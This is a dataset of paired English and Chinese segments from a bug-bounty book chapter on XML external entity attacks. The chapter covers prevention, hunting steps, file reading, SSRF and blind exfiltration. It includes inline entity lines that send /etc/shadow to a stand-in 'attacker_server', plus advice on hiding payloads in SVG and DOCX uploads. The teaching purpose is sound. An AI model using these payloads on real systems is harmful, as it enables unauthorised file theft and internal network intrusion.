- en: '15'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: XML External Entity
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
- en: '![](image_fi/book_art/chapterart.png)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
- en: '*XML external entity attacks (**XXEs)* are fascinating vulnerabilities that
    target the XML parsers of an application. XXEs can be very impactful bugs, as
    they can lead to confidential information disclosure, SSRFs, and DoS attacks.
    But they are also difficult to understand and exploit.'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we’ll dive into the ins and outs of XXEs so you can find one
    in the wild. We will also talk about how to use XXEs to extract sensitive files
    on the target system, launch SSRFs, and trigger DoS attacks.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
- en: Mechanisms
  id: totrans-5
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: '*Extensible Markup Language (**XML)* is designed for storing and transporting
    data. This markup language allows developers to define and represent arbitrary
    data structures in a text format using a tree-like structure like that of HTML.
    For example, web applications commonly use XML to transport identity information
    in Security Assertion Markup Language (SAML) authentication. The XML might look
    like this:'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  id: totrans-7
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Notice here that unlike HTML, XML has user-defined tag names that let you structure
    the XML document freely. The XML format is widely used in various functionalities
    of web applications, including authentication, file transfers, and image uploads,
    or simply to transfer HTTP data from the client to the server and back.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
- en: 'XML documents can contain a *document type definition (**DTD)*, which defines
    the structure of an XML document and the data it contains. These DTDs can be loaded
    from external sources or declared in the document itself within a `DOCTYPE` tag.
    For example, here is a DTD that defines an XML entity called `file`:'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  id: totrans-10
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'XML entities work like variables in programming languages: any time you reference
    this entity by using the syntax `&file`, the XML document will load the value
    of `file` in its place. In this case, any reference of `&file` within the XML
    document will be replaced by `"Hello!"`.'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
- en: 'XML documents can also use *external entities* to access either local or remote
    content with a URL. If an entity’s value is preceded by a `SYSTEM` keyword, the
    entity is an external entity, and its value will be loaded from the URL. You can
    see here that the following DTD declares an external entity named `file`, and
    the value of `file` is the contents of *file:///example.txt* on the local filesystem:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  id: totrans-13
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: That last line loads the `file` entity in the XML document, referencing the
    contents of the text file located at *file:///example.txt*.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
- en: 'External entities can also load resources from the internet. This DTD declares
    an external entity named `file` that points to the home page of *example.com*:'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  id: totrans-16
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: What’s the vulnerability hidden within this functionality? The issue is that
    if users can control the values of XML entities or external entities, they might
    be able to disclose internal files, port-scan internal machines, or launch DoS
    attacks.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: Many sites use older or poorly configured XML parsers to read XML documents.
    If the parser allows user-defined DTDs or user input within the DTD and is configured
    to parse and evaluate the DTD, attackers can declare their own external entities
    to achieve malicious results.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 许多网站使用较旧或配置不当的 XML 解析器来读取 XML 文档。如果解析器允许用户定义 DTD 或在 DTD 中输入用户内容，并且被配置为解析和评估
    DTD，攻击者可以声明自己的外部实体，从而实现恶意结果。
- en: 'For example, let’s say a web application lets users upload their own XML document.
    The application will parse and display the document back to the user. A malicious
    user can upload a document like this one to read the */etc/shadow* file on the
    server, which is where Unix systems store usernames and their encrypted passwords:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，假设一个 Web 应用程序允许用户上传自己的 XML 文档。该应用程序将解析并将文档显示回给用户。恶意用户可以上传类似于此的文档来读取服务器上的
    */etc/shadow* 文件，这是 Unix 系统存储用户名及其加密密码的位置：
- en: '[PRE4]'
  id: totrans-20
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: Parsing this XML file will cause the server to return the contents of */etc/shadow*
    because the XML file includes */etc/shadow* via an external entity 1.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 解析此 XML 文件会导致服务器返回 */etc/shadow* 的内容，因为该 XML 文件通过外部实体 1 包含了 */etc/shadow*。
- en: Attacks like these are called XML external entity attacks, or *XXEs*. Applications
    are vulnerable to XXEs when the application accepts user-supplied XML input or
    passes user input into DTDs, which is then parsed by an XML parser, and that XML
    parser reads local system files or sends internal or outbound requests specified
    in the DTD.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 这种攻击被称为 XML 外部实体攻击，或称 *XXEs*。当应用程序接受用户提供的 XML 输入或将用户输入传递给 DTD（文档类型定义），然后由 XML
    解析器解析时，应用程序就容易受到 XXE 攻击，而这个 XML 解析器会读取本地系统文件或发送 DTD 中指定的内部或外部请求。
- en: Prevention
  id: totrans-23
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 预防
- en: Preventing XXEs is all about limiting the capabilities of an XML parser. First,
    because DTD processing is a requirement for XXE attacks, you should disable DTD
    processing on the XML parsers if possible. If it’s not possible to disable DTDs
    completely, you can disable external entities, parameter entities (covered in
    “Escalating the Attack” on page 254), and inline DTDs (DTDs included in the XML
    document). And to prevent XXE-based DoS, you can limit the XML parser’s parse
    time and parse depth. You can also disable the expansion of entities entirely.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 防止 XXE 攻击的关键是限制 XML 解析器的能力。首先，由于 DTD 处理是 XXE 攻击的前提，你应尽可能禁用 XML 解析器的 DTD 处理。如果无法完全禁用
    DTD，你可以禁用外部实体、参数实体（详见第 254 页的“攻击升级”部分）以及内联 DTD（包含在 XML 文档中的 DTD）。为了防止基于 XXE 的
    DoS（拒绝服务攻击），你可以限制 XML 解析器的解析时间和解析深度。你还可以完全禁用实体扩展。
- en: The mechanisms for disabling DTD processing and configuring parser behavior
    vary based on the XML parser in use. For example, if you’re using the default
    PHP XML parser, you need to set `libxml_disable_entity_loader` to `TRUE` to disable
    the use of external entities. For more information on how to do it for your parser,
    consult the OWASP Cheat Sheet at [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md)*.*
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 禁用 DTD 处理和配置解析器行为的机制会根据使用的 XML 解析器而有所不同。例如，如果你使用的是默认的 PHP XML 解析器，你需要将 `libxml_disable_entity_loader`
    设置为 `TRUE` 来禁用外部实体的使用。有关如何在你的解析器上执行此操作的更多信息，请参考 OWASP Cheat Sheet，访问 [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md)*.*
- en: Another path you can take is input validation. You could create an allowlist
    for user-supplied values that are passed into XML documents, or sanitize potentially
    hostile data within XML documents, headers, or nodes. Alternatively, you can use
    less complex data formats like JSON instead of XML whenever possible.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以采取的另一种方式是输入验证。你可以为传入 XML 文档的用户提供值创建白名单，或者清理 XML 文档、头信息或节点中的潜在恶意数据。或者，尽可能使用更简单的数据格式，如
    JSON，来代替 XML。
- en: In classic XXEs (like the example I showed in “Mechanisms” on page 249), attackers
    exfiltrate data by making the application return data in an HTTP response. If
    the server takes XML input but does not return the XML document in an HTTP response,
    attackers can use blind XXEs to exfiltrate data instead. Blind XXEs steal data
    by having the target server make an outbound request to the attacker’s server
    with the stolen data. To prevent blind XXEs, you can disallow outbound network
    traffic.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
- en: Finally, you can routinely review your source code to detect and fix XXE vulnerabilities.
    And because many XXEs are introduced by an application’s dependencies instead
    of its custom source code, you should keep all dependencies in use by your application
    or by the underlying operating system up-to-date.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
- en: Hunting for XXEs
  id: totrans-29
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: To find XXEs, start with locating the functionalities that are prone to them.
    This includes anywhere that the application receives direct XML input, or receives
    input that is inserted into XML documents that the application parses.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 1: Find XML Data Entry Points'
  id: totrans-31
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Many applications use XML data to transfer information within HTTP messages.
    To look for these endpoints, you can open up your proxy and browse the target
    application. Then, find XML-like documents in HTTP messages by looking for the
    previously mentioned tree-like structures, or by looking for the signature of
    an XML document: the string `"<?xml"`.'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
- en: Keep an eye out for encoded XML data in the application as well. Sometimes applications
    use base64- or URL-encoded XML data for ease of transportation. You can find these
    XML entry points by decoding any blocks of data that look suspicious. For example,
    a base64-encoded block of XML code tends to start with `LD94bWw`, which is the
    base64-encoded string of `"<?xml"`.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
- en: Besides searching for XML within HTTP messages, you should also look for file-upload
    features. This is because XML forms the basis of many common file types. If you
    can upload one of these file types, you might be able to smuggle XML input to
    the application’s XML parser. XML can be written into document and image formats
    like XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, and RSS feeds. Furthermore, metadata
    embedded within images like GIF, PNG, and JPEG files are all based on XML. SOAP
    web services are also XML based. We’ll talk more about SOAP in Chapter 24.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
- en: 'In addition to looking for locations where the application accepts XML data
    by default, you can try to force the application into parsing XML data. Sometimes
    endpoints take plaintext or JSON input by default but can process XML input as
    well. On endpoints that take other formats of input, you can modify the `Content-Type`
    header of your request to one of the following headers:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  id: totrans-36
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: Then, try to include XML data in your request body. Sometimes this is all it
    takes to make the target application parse your XML input.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
- en: Finally, some applications receive user-submitted data and embed it into an
    XML document on the server side. If you suspect that is happening, you can submit
    an XInclude test payload to the endpoint, which I introduce in step 5.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，一些应用程序会接收用户提交的数据并将其嵌入到服务器端的 XML 文档中。如果你怀疑这种情况发生了，可以向端点提交一个 XInclude 测试 payload，我将在第
    5 步中介绍。
- en: 'Step 2: Test for Classic XXE'
  id: totrans-39
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 第 2 步：测试经典 XXE
- en: Once you’ve determined that the endpoints can be used to submit XML data, you
    can start to test for the presence of functionalities needed for XXE attacks.
    This usually involves sending a few trial-and-error XXE payloads and observing
    the application’s response.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你确定端点可以用来提交 XML 数据，就可以开始测试是否具备 XXE 攻击所需的功能。这通常涉及发送一些反复试验的 XXE payload，并观察应用程序的响应。
- en: 'If the application is returning results from the parser, you might be able
    to carry out a classic XXE attack—that is, you can read the leaked files directly
    from the server’s response. To search for classic XXEs, first check whether XML
    entities are interpreted by inserting XML entities into the XML input and see
    if it loads properly:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 如果应用程序从解析器返回结果，你可能能够执行经典的 XXE 攻击——也就是说，你可以直接从服务器的响应中读取泄漏的文件。要搜索经典的 XXE，首先检查
    XML 实体是否被解析，通过将 XML 实体插入到 XML 输入中，看看是否能正常加载：
- en: '[PRE6]'
  id: totrans-42
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'Then, test whether the `SYSTEM` keyword is usable by trying to load a local
    file:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，测试 `SYSTEM` 关键字是否可用，方法是尝试加载本地文件：
- en: '[PRE7]'
  id: totrans-44
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'When the `SYSTEM` keyword does not work, you can replace it with the `PUBLIC`
    keyword instead. This tag requires you to supply an ID surrounded by quotes after
    the `PUBLIC` keyword. The parser uses this to generate an alternate URL for the
    value of the entity. For our purposes, you can just use a random string in its
    place:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 当 `SYSTEM` 关键字无法使用时，你可以改用 `PUBLIC` 关键字。这个标签要求你在 `PUBLIC` 关键字后提供一个带引号的 ID。解析器会用这个
    ID 生成一个替代的 URL，用于实体值。为了我们的目的，你可以直接用一个随机字符串代替：
- en: '[PRE8]'
  id: totrans-46
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: Next, try to extract some common system files. You can start with the files
    */etc/hostname* and */etc/passwd*, for example. Another file I like to extract
    using XXEs is *.bash_history*. This file is typically located at each user’s home
    directory (*~/.bash_history*) and contains a list of commands previously executed.
    By reading this file, you can often uncover juicy information like internal URLs,
    IP addresses, and file locations. Common system files or paths mentioned here
    can be restricted, so don’t give up if the first few files you try to read do
    not display.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，尝试提取一些常见的系统文件。例如，你可以从文件 */etc/hostname* 和 */etc/passwd* 开始。我喜欢使用 XXE 提取的另一个文件是
    *.bash_history*。这个文件通常位于每个用户的主目录下 (*~/.bash_history*)，并包含以前执行的命令列表。通过读取此文件，你通常可以发现一些有价值的信息，比如内部
    URL、IP 地址和文件位置。这里提到的常见系统文件或路径可能会受到限制，所以如果你尝试读取的前几个文件没有显示出来，也不要放弃。
- en: 'Step 3: Test for Blind XXE'
  id: totrans-48
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 第 3 步：测试盲 XXE
- en: If the server takes XML input but does not return the XML document in an HTTP
    response, you can test for a blind XXE instead. Instead of reading files from
    the server’s response, most blind XXE attacks steal data by having the target
    server make a request to the attacker’s server with the exfiltrated information.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 如果服务器接收 XML 输入，但没有在 HTTP 响应中返回 XML 文档，你可以改为测试盲 XXE。盲 XXE 攻击通常不是通过从服务器的响应中读取文件来窃取数据，而是通过让目标服务器向攻击者的服务器发送请求，将泄漏的信息提取出来。
- en: 'First, you need to make sure that the server can make outbound connections
    by having the target make a request to your server. You can set up a callback
    listener by following the instructions in Chapter 13. The process for setting
    up a listener to discover XXEs is the same as setting up to find SSRFs. Try making
    an external entity load a resource on your machine. To bypass common firewall
    restrictions, you should test with ports 80 and 443 first, because the target’s
    firewall might not allow outbound connections on other ports:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，你需要确保服务器能够进行外部连接，方法是让目标服务器向你的服务器发出请求。你可以按照第 13 章中的说明设置回调监听器。设置监听器来发现 XXE
    的过程与设置 SSRF 查找是相同的。尝试让外部实体加载你机器上的资源。为了绕过常见的防火墙限制，你应该首先测试 80 和 443 端口，因为目标的防火墙可能不允许其他端口的外部连接：
- en: '[PRE9]'
  id: totrans-51
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: You can then search the access logs of your server and look for a request to
    that particular file. In this case, you’ll be looking for a GET request for the
    *xxe_test.txt* file. Once you’ve confirmed that the server can make outbound requests,
    you can try to exfiltrate files by using the techniques covered in upcoming sections.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 4: Embed XXE Payloads in Different File Types'
  id: totrans-53
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Besides testing for XXEs on HTTP request bodies, you can try to upload files
    containing XXE payloads to the server. File-upload endpoints and file parsers
    are often not protected by the same XXE protection mechanisms as regular endpoints.
    And hiding your XXE payloads in different file types means that you will be able
    to upload your payloads even if the application restricts the type of files that
    can be uploaded.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
- en: This section presents just a few examples of how to embed XXE payloads in various
    file types. You should be able to find more examples by searching the internet.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
- en: 'To embed an XXE payload in an SVG image, you need to first open up the image
    as a text file. Take this SVG image of a blue circle, for example:'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  id: totrans-57
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'Insert the XXE payload by adding a DTD directly into the file and referencing
    the external entity in the SVG image. You can then save the file as an *.svg*
    file and upload it to the server:'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  id: totrans-59
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Microsoft Word documents (*.docx* files), PowerPoint presentations (*.pptx*),
    and Excel worksheets (*.xlxs*) are archive files containing XML files, so you
    can insert XXE payloads into them as well. To do so, you should first unzip the
    document file. For example, I used the Unarchiver software on a Mac to extract
    the files. You should see a few folders containing XML files ([Figure 15-1](#figure15-1)).
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
- en: '![f15001](image_fi/501546c15/f15001.png)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
- en: 'Figure 15-1: When you unarchive a DOCX file, you will see a few folders containing
    XML files.'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
- en: Then you can simply insert your payload into */word/document.xml*, */ppt/presentation.xml*,
    or */xl/workbook.xml*. Finally, repack the archives into the *.docx*, *.pptx*,
    or *.xlxs* format.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
- en: 'You can do this by `cd`ing into the unarchived folder and running the command
    `zip -r` `filename.format` `*`. The `zip` command line utility archives files.
    The `-r` option tells `zip` to recursively archive files in directories, `filename.format`
    tells zip what the name of the archived file should be, and `*` tells zip to archive
    all files in the current directory. In this case, you can run these commands to
    create a new DOCX file:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: You should see the repacked document appear in the current directory.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 5: Test for XInclude Attacks'
  id: totrans-67
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Sometimes you cannot control the entire XML document or edit the DTD of an XML
    document. But you can still exploit an XXE vulnerability if the target application
    takes your user input and inserts it into XML documents on the backend.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
- en: In this situation, you might be able to execute an XInclude attack instead.
    *XInclude* is a special XML feature that builds a separate XML document from a
    single XML tag named `xi:include`. If you can control even a single piece of unsanitized
    data passed into an XML document, you might be able to place an XInclude attack
    within that value.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，你可能能够执行一个XInclude攻击。*XInclude*是一种特殊的XML功能，它通过一个名为`xi:include`的单一XML标签构建一个独立的XML文档。如果你能够控制传入XML文档的任何未经过滤的数据，可能就能将一个XInclude攻击嵌入到该值中。
- en: 'To test for XInclude attacks, insert the following payload into the data entry
    point and see if the file that you requested gets sent back in the response body:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 要测试XInclude攻击，可以将以下负载插入到数据输入点，看看请求的文件是否会被返回到响应体中：
- en: '[PRE13]'
  id: totrans-71
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: This piece of XML code does two things. First, it references the *http://www.w3.org/2001/XInclude*
    namespace so that we can use the `xi:include` element. Next, it uses that element
    to parse and include the */etc/hostname* file in the XML document.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 这段XML代码做了两件事。首先，它引用了*http://www.w3.org/2001/XInclude*命名空间，以便我们可以使用`xi:include`元素。接下来，它使用该元素来解析并将*/etc/hostname*文件包含到XML文档中。
- en: Escalating the Attack
  id: totrans-73
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 升级攻击
- en: What you can achieve with an XXE vulnerability depends on the permissions given
    to the XML parser. Generally, you can use XXEs to access and exfiltrate system
    files, source code, and directory listings on the local machine. You can also
    use XXEs to perform SSRF attacks to port-scan the target’s network, read files
    on the network, and access resources that are hidden behind a firewall. Finally,
    attackers sometimes use XXEs to launch DoS attacks.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 使用XXE漏洞能达到的效果取决于XML解析器所赋予的权限。通常，你可以使用XXE访问和导出系统文件、源代码以及本地机器上的目录列表。你还可以利用XXE进行SSRF攻击，扫描目标网络的端口、读取网络上的文件，并访问被防火墙隐藏的资源。最后，攻击者有时使用XXE发起DoS攻击。
- en: Reading Files
  id: totrans-75
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 读取文件
- en: 'To read local files by using an XXE vulnerability, place the local file’s path
    into the DTD of the parsed XML file. Local files can be accessed by using the
    *file://* URL scheme followed by the file’s path on the machine. This payload
    will make the XML parser return the contents of the */etc/shadow* file on the
    server:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 要通过XXE漏洞读取本地文件，可以将本地文件的路径放入被解析XML文件的DTD中。可以使用*file://* URL方案，后跟机器上文件的路径来访问本地文件。这个负载将使XML解析器返回服务器上*/etc/shadow*文件的内容：
- en: '[PRE14]'
  id: totrans-77
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: Launching an SSRF
  id: totrans-78
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 发起SSRF
- en: 'Besides retrieving system files, you can use the XXE vulnerability to launch
    SSRF attacks against the local network. For example, you can launch a port scan
    by switching out the external entity’s URL with different ports on the target
    machine. This is similar to the port-scanning technique mentioned in Chapter 13,
    where you can determine the status of a port by analyzing differences in the server’s
    responses:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 除了获取系统文件外，你还可以利用XXE漏洞对本地网络发起SSRF攻击。例如，你可以通过将外部实体的URL替换为目标机器上的不同端口来发起端口扫描。这类似于第13章中提到的端口扫描技术，你可以通过分析服务器响应的差异来确定端口的状态：
- en: '[PRE15]'
  id: totrans-80
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'You can also use an XXE to launch an SSRF to pull instance metadata, as we
    talked about in Chapter 13. This payload will make the parser return AWS metadata:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以使用XXE发起SSRF来获取实例元数据，就像我们在第13章中讨论过的那样。这个负载将使解析器返回AWS元数据：
- en: '[PRE16]'
  id: totrans-82
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: When trying to view unintended data like this, you should look for the exfiltrated
    data by inspecting the page source code (right-click the page and click **View
    Source**) or HTTP response directly, rather than viewing the HTML page rendered
    by the browser, because the browser might not render the page correctly.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 当尝试查看像这样意外的数据时，你应该通过检查页面源代码（右键点击页面并选择**查看源代码**）或直接查看HTTP响应，而不是查看浏览器呈现的HTML页面，因为浏览器可能无法正确呈现页面。
- en: Of course, what you can do with an XXE-based SSRF isn’t simply limited to network
    scanning and retrieving instance metadata. You can also use the information you
    gathered to pivot into internal services. For more ideas of how to exploit SSRFs,
    visit Chapter 13.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 当然，你使用XXE攻击所能做的不仅限于网络扫描和获取实例元数据。你还可以利用收集到的信息转向内部服务。想了解更多如何利用SSRF的思路，可以参考第13章。
- en: Using Blind XXEs
  id: totrans-85
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用盲XXE
- en: 'Sometimes the application does not return the results of XML parsing to the
    user. In this case, you can still exfiltrate data to a server that you control
    by forcing the XML parser to make an external request with the desired data in
    the request URL—the blind XXE attacks mentioned earlier. Then you can monitor
    your server logs to retrieve the exfiltrated data. At this point, you might think
    the payload of a blind XXE looks like this:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 有时应用程序不会将XML解析结果返回给用户。在这种情况下，你仍然可以通过强迫XML解析器在请求的URL中包含所需数据，向你控制的服务器发送外部请求，从而提取数据——这就是前面提到的盲目XXE攻击。然后，你可以通过监控服务器日志来获取提取的数据。此时，你可能会认为盲目XXE的有效载荷看起来像这样：
- en: '[PRE17]'
  id: totrans-87
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: This payload is meant to exfiltrate the */etc/shadow* file on the server by
    making a request to the attacker’s server with the file’s contents in a URL parameter.
    The payload first defines an external entity `file` that contains the contents
    of the local */etc/shadow* file. Then it makes a request to the attacker’s server
    with the contents of that file in the request’s URL parameter.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 这个有效载荷旨在通过将文件内容作为 URL 参数传递给攻击者的服务器，从服务器上提取*/etc/shadow*文件。该有效载荷首先定义了一个名为`file`的外部实体，包含本地*/etc/shadow*文件的内容。然后，它通过将该文件的内容作为请求的
    URL 参数，向攻击者的服务器发起请求。
- en: 'However, this attack probably wouldn’t work, because most parsers do not allow
    external entities to be included in other external entities. And parsers would
    stop processing the DTD once they encounter this line: `<!ENTITY exfiltrate SYSTEM
    "http://attacker_server/?&file">`. So exfiltrating data by using a blind XXE is
    a bit more complicated than in a classic XXE.'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，这个攻击可能不会成功，因为大多数解析器不允许将外部实体包含在其他外部实体中。解析器会在遇到以下这一行时停止处理DTD：`<!ENTITY exfiltrate
    SYSTEM "http://attacker_server/?&file">`。因此，使用盲目XXE提取数据比经典XXE要复杂一些。
- en: 'Fortunately, XML DTDs have a feature called *parameter entities* that we can
    use instead. Parameter entities are XML entities that can be referenced only elsewhere
    within the DTD. They are declared and referenced with a percent (`%`) character.
    For example, the blind XXE payload I introduced earlier can be rewritten as follows:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 幸运的是，XML DTD具有一个叫做*参数实体*的特性，我们可以利用它。参数实体是只能在DTD的其他地方引用的XML实体。它们通过百分号（`%`）字符声明和引用。例如，我之前介绍的盲目XXE有效载荷可以改写如下：
- en: '[PRE18]'
  id: totrans-91
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: This DTD first declares a parameter entity called `file` that contains the file
    contents of */etc/shadow* 1. Then it declares a parameter entity named `ent` that
    contains a dynamic declaration of another parameter entity called `exfiltrate`
    2. `&#x25;` is the hex-encoded version of the percent sign (`%`). Depending on
    your target, hex encoding is sometimes needed for special characters within dynamic
    declarations. The `exfiltrate` entity points to the attacker’s server with the
    contents of */etc/shadow* in the URL parameter. Finally, the DTD references `ent`
    to declare the `exfiltrate` entity and then references `exfiltrate` to trigger
    the outbound request.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 这个DTD首先声明了一个名为`file`的参数实体，包含*/etc/shadow*文件的内容 1。然后声明了一个名为`ent`的参数实体，包含另一个参数实体`exfiltrate`的动态声明
    2。`&#x25;`是百分号（`%`）的十六进制编码版本。根据目标的不同，十六进制编码有时是需要的，特别是在动态声明中涉及到特殊字符时。`exfiltrate`实体指向攻击者的服务器，并将*/etc/shadow*的内容放在URL参数中。最后，DTD引用`ent`来声明`exfiltrate`实体，再通过引用`exfiltrate`触发外部请求。
- en: 'But if you try to upload this payload to a target, you might notice that it
    does not work. This is because, according to XML specifications, parameter entities
    are treated differently in inline DTDs (DTDs within the XML document specified
    within the `DOCTYPE` tag) and external DTDs (a separate DTD hosted elsewhere).
    Within inline DTDs, parameter entities cannot be referenced within markups, so
    this line wouldn’t work: `<!ENTITY &#x25; exfiltrate SYSTEM ''http://attacker_server/?%file;''>`,
    whereas in external DTDs, no such restriction exists.'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 但如果你尝试将这个有效载荷上传到目标，可能会发现它不起作用。这是因为，根据XML规范，参数实体在内联DTD（XML文档中的`DOCTYPE`标签内指定的DTD）和外部DTD（在其他地方托管的单独DTD）中会被不同对待。在内联DTD中，参数实体不能在标记中引用，因此这一行将不起作用：`<!ENTITY
    &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>`，而在外部DTD中，则没有这样的限制。
- en: 'To exfiltrate data via a blind XXE, you have to overcome this restriction by
    hosting an external DTD on your server. Try hosting a file named *xxe.dtd* on
    your server:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 要通过盲目XXE提取数据，你必须克服这一限制，方法是将外部DTD托管在你的服务器上。尝试在你的服务器上托管一个名为*xxe.dtd*的文件：
- en: '[PRE19]'
  id: totrans-95
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: 'Then make the target parser interpret your DTD by specifying it within a parameter
    entity and referencing that entity:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: This way, the target server will parse the submitted XML file and notice that
    a parameter entity is referencing an external file. Then the target server will
    retrieve and parse that external DTD, so your payload will execute, and the target
    will send the exfiltrated data back to your server. Here, we are exfiltrating
    the contents of the file */etc/shadow* as a URL parameter in a request to the
    attacker’s server.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
- en: Notice that in this attack, we used only parameter entities and did not use
    external entities at all! If the parser blocks external entities or limits the
    referencing of entities to protect against XXE, you can use this technique as
    well. However, this strategy can exfiltrate only a single line of the target file,
    because the newline character (`\n`) within target files will interrupt the outbound
    URL and may even cause the HTTP request to fail.
  id: totrans-99
